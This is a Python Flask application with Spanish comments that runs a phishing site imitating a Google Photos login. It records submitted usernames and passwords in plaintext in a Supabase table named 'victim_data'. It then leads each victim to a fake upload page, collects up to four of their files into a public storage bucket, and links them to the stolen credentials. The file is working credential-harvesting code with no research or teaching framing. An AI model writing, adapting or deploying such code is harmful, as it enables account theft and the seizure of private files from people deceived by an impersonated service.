import os
import datetime
import uuid
import json
from io import BytesIO

from flask import Flask, render_template, request, redirect, url_for, session
from supabase import create_client, PostgrestAPIError
# Importar la librería de Storage
from supabase.lib.storage import StorageClient

# --- CONFIGURACIÓN DE LA APLICACIÓN Y SUPABASE ---

# Configuración de Flask
app = Flask(__name__)
# Usar la clave secreta de Render o una por defecto
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'default_secret_key_very_insecure') 
app.config['SUPABASE_URL'] = os.environ.get('SUPABASE_URL')
app.config['SUPABASE_KEY'] = os.environ.get('SUPABASE_ANON_KEY')

# Nota: Las variables de entorno de Telegram (BOT_TOKEN, CHAT_ID) han sido eliminadas.

# Nombre del bucket de Supabase Storage
BUCKET_NAME = "shared_files" 

# Inicialización de Supabase
try:
    if not app.config['SUPABASE_URL'] or not app.config['SUPABASE_KEY']:
        # Si las variables obligatorias no existen, levantamos una excepción
        raise ValueError("Las variables de entorno SUPABASE_URL y SUPABASE_ANON_KEY son obligatorias.")
    
    supabase = create_client(app.config['SUPABASE_URL'], app.config['SUPABASE_KEY'])
    storage: StorageClient = supabase.storage
    print("Conexión con Supabase y Storage establecida.")

except Exception as e:
    print(f"Error en la inicialización de Supabase: {e}")
    supabase = None
    storage = None


# Nombre de la tabla de la base de datos
DB_TABLE = "victim_data"


# --- RUTAS Y VISTAS ---

@app.route('/')
def index():
    """Página de inicio de sesión (simulando Google Photos)."""
    # Limpia la sesión al inicio
    session.clear()
    return render_template('index.html')

@app.route('/process_login', methods=['POST'])
def process_login():
    """Guarda credenciales y redirige a la página de carga de archivos."""
    if not supabase:
        return error_page("Error de aplicación", "El servicio de base de datos no está disponible.")

    username = request.form.get('username')
    password = request.form.get('password')
    
    # Generar un ID de víctima y guardarlo en la sesión para usarlo en la siguiente ruta
    victim_id = str(uuid.uuid4())
    session['victim_id'] = victim_id 
    
    current_timestamp_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
    
    try:
        # Insertar los datos de login inicialmente
        data_to_insert = {
            "username": username, 
            "password": password, 
            "victim_id": victim_id,
            "timestamp": current_timestamp_iso,
            # Placeholder para los archivos que se subirán después
            "file_name": "Esperando archivos",
            "file_url": "Esperando archivos",
        }
        
        response = supabase.table(DB_TABLE).insert(data_to_insert).execute()
        
        if response.data and len(response.data) > 0:
            print(f"Credenciales capturadas con ID: {victim_id}.")
            
            # La notificación por Telegram ha sido eliminada.
            
            # Redirigir a la página de carga de archivos
            return redirect(url_for('upload_page'))
        else:
            return error_page("Error de Base de Datos", "No se pudo insertar el registro. Verifica las políticas RLS.")

    except PostgrestAPIError as e: 
        return error_page("Error de Base de Datos", f"Ocurrió un error al insertar los datos: {e.message}")
    except Exception as e:
        return error_page("Error Desconocido", f"Ha ocurrido un error inesperado: {str(e)}")


@app.route('/upload')
def upload_page():
    """Muestra la página de carga de archivos con el diseño de Google Photos."""
    if 'victim_id' not in session:
        return redirect(url_for('index'))
    return render_template('upload.html')

@app.route('/upload_file', methods=['POST'])
def upload_file():
    """
    Recibe la lista de archivos, los sube a Supabase Storage y actualiza el registro en la DB.
    Permite un máximo de 4 archivos a la vez.
    """
    victim_id = session.get('victim_id')
    if not victim_id:
        return redirect(url_for('index'))
    
    if not storage:
        return error_page("Error de Almacenamiento", "El servicio de Supabase Storage no está disponible.")

    # OBTENER LA LISTA DE ARCHIVOS
    uploaded_files = request.files.getlist('files')
    
    uploaded_data_list = []
    
    # Limitar a un máximo de 4 archivos (Red de seguridad de Back-end)
    files_to_process = uploaded_files[:4]
    
    for file in files_to_process:
        if file and file.filename:
            file_extension = file.filename.split('.')[-1]
            # Usar el ID de la víctima y un UUID para el nombre único
            unique_filename = f"{victim_id}_{uuid.uuid4().hex}.{file_extension}"
            
            # La función upload de Supabase requiere los bytes del archivo
            file_bytes = file.read()
            
            try:
                # Subir el archivo al bucket
                storage.from_(BUCKET_NAME).upload(
                    path=unique_filename,
                    file=file_bytes,
                    file_options={'content-type': file.content_type}
                )
                
                # Obtener la URL pública del archivo
                res = storage.from_(BUCKET_NAME).get_public_url(unique_filename)
                file_url = res
                
                print(f"Archivo {file.filename} subido con éxito. URL: {file_url}")
                
                uploaded_data_list.append({
                    "name": file.filename,
                    "url": file_url
                })

                # La notificación por Telegram ha sido eliminada.

            except Exception as e:
                # Si falla una subida, registramos el error y continuamos con el siguiente archivo
                print(f"Error al subir el archivo {file.filename}: {e}")

    # Si se subió al menos un archivo, actualizamos el registro de la víctima en la DB
    if uploaded_data_list:
        # Convertir listas a cadenas JSON para almacenarlas en una sola columna (como se requiere)
        file_names_str = json.dumps([data['name'] for data in uploaded_data_list])
        file_urls_str = json.dumps([data['url'] for data in uploaded_data_list])
        
        try:
            # Buscar el registro de la víctima y actualizar los campos de archivos
            supabase.table(DB_TABLE).update({
                "file_name": file_names_str,
                "file_url": file_urls_str
            }).eq('victim_id', victim_id).execute()
            
            print(f"Registro de DB actualizado para ID: {victim_id} con {len(uploaded_data_list)} archivos.")
            
        except PostgrestAPIError as e:
            return error_page("Error de Base de Datos", f"Fallo al actualizar el registro con los datos de archivo: {e.message}")
    
    # Redirigir siempre a la página de agradecimiento
    return redirect(url_for('thank_you'))

@app.route('/thank_you')
def thank_you():
    """Muestra la página de agradecimiento o carga final."""
    session.clear()
    return render_template('thank_you.html')

# Manejador de errores personalizado
def error_page(title, message):
    """Muestra una página de error con un mensaje detallado."""
    return render_template('error.html', error_title=title, error_message=message), 500


# --- EJECUCIÓN DEL SERVIDOR ---

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    # Desactivar debug en producción
    app.run(debug=os.environ.get('FLASK_ENV') == 'development', host='0.0.0.0', port=port)
